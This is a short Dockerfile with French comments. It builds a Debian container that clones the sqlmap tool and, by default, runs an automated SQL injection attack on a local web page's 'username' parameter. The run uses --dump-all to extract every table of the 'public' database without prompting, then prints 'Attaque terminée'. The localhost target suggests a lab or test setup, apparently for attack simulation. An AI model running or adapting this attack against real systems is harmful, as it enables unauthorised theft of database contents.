FROM debian:11-slim

# Installation des dépendances
RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    git \
    curl \
    && rm -rf /var/lib/apt/lists/*

# Clonage de SQLMap
WORKDIR /opt
RUN git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git


CMD bash -c "\
  sleep 5; \
  python3 /opt/sqlmap/sqlmap.py \
    -u 'http://localhost:8080/index.php?username=test' \
    --banner \
    --batch \
    --dump-all -D 'public' && \
  echo '[+] Attaque terminée.'"
